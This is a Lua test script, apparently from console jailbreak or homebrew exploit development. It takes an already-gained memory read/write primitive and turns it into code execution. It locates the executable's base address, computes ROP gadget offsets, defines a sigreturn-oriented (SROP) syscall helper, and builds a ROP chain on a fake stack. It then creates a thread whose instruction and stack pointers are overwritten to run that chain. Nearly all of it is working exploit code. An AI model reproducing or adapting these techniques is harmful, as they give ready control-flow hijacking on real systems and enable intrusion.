-- CRASH_CLASS: LOW
-- Minimal thread test: pure getcontext + override RIP/RSP → nanosleep
-- Tests the 142l-D pattern to confirm threads still work

print("=== THREAD TEST ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

print("STEP1")

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_thr = make_syscall(430)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)

local pid = to_num(sc20())
print("pid=" .. pid)

print("STEP2")

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

print("STEP3")

-- Eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
print("eboot=" .. string.format("0x%X%08X", ehi, elo))

-- sc_addr from getcontext
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

print("STEP4")

-- Gadgets
local g_ret = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))

-- SROP helper
local function srop(num, a1, a2)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

-- Timespec: 30s
local tspec = gpu + 0x200
wq(tspec, uint64(30))
wq(tspec + 8, uint64(0))

-- Marker: thread writes 0xCAFEBABE here
local marker = gpu + 0x300
wq(marker, uint64(0xDEADDEAD))

print("STEP5")

-- Thread context: pure getcontext + override RIP/RSP only
local ctx = gpu + 0x10000
for off = 0, 0x4FF, 4 do wd(ctx + off, 0) end
pcall(function() return sc_gc(uint64(ctx)) end)

-- Dump gate fields
print("gate +0x108=" .. hex(safe_rq(ctx + 0x108)))
print("gate +0x0D0=" .. hex(safe_rq(ctx + 0xD0)))
print("gate +0x110=" .. hex(safe_rq(ctx + 0x110)))
print("gate +0x118=" .. hex(safe_rq(ctx + 0x118)))
print("CS   +0x0C0=" .. hex(safe_rq(ctx + 0xC0)))
print("RIP  +0x0E0=" .. hex(safe_rq(ctx + 0xE0)))
print("RSP  +0x0F8=" .. hex(safe_rq(ctx + 0xF8)))
print("SS   +0x100=" .. hex(safe_rq(ctx + 0x100)))

print("STEP6")

-- Build ROP: nanosleep(30s) loop
local stack = gpu + 0x20000
for off = 0, 0x7FFF, 4 do wd(stack + off, 0) end
local rop = stack + 0x7000
wq(rop + 0x00, g_pop_rdi)
wq(rop + 0x08, ua(tspec))
wq(rop + 0x10, g_pop_rsi)
wq(rop + 0x18, uint64(0))
wq(rop + 0x20, g_pop_rax)
wq(rop + 0x28, uint64(240))
wq(rop + 0x30, sc_addr)
-- second nanosleep
wq(rop + 0x38, g_pop_rdi)
wq(rop + 0x40, ua(tspec))
wq(rop + 0x48, g_pop_rsi)
wq(rop + 0x50, uint64(0))
wq(rop + 0x58, g_pop_rax)
wq(rop + 0x60, uint64(240))
wq(rop + 0x68, sc_addr)

-- Override ONLY RIP and RSP
wq(ctx + 0xE0, g_ret)
wq(ctx + 0xF8, ua(rop))

print("STEP7 creating thread")

local tid_buf = gpu + 0x40000
wq(tid_buf, uint64(0xDEADDEAD))

local ok_thr, rv_thr = pcall(function()
    return sc_thr(uint64(ctx), uint64(tid_buf), uint64(0))
end)
local tid_q = safe_rq(tid_buf)
local th2, tl2 = get_hi_lo(tid_q)
print("rv=" .. tostring(rv_thr) .. " tid=" .. tl2)

print("STEP8")

if to_num(rv_thr) == 0 then
    print("THREAD_CREATED")
    -- Wait 500ms
    local ts_half = memory.alloc(16)
    wq(ts_half, uint64(0))
    wq(ts_half + 8, uint64(500000000))
    pcall(function() make_syscall(240)(uint64(ts_half), uint64(0)) end)

    local kill_rv = srop(433, uint64(tl2), uint64(0))
    local kh, kl = get_hi_lo(kill_rv)
    print("thr_kill=" .. hex(kill_rv) .. " " .. ((kl == 0 and kh == 0) and "ALIVE" or "dead"))
else
    print("THREAD_FAILED rv=" .. tostring(rv_thr))
end

print("=== DONE ===")
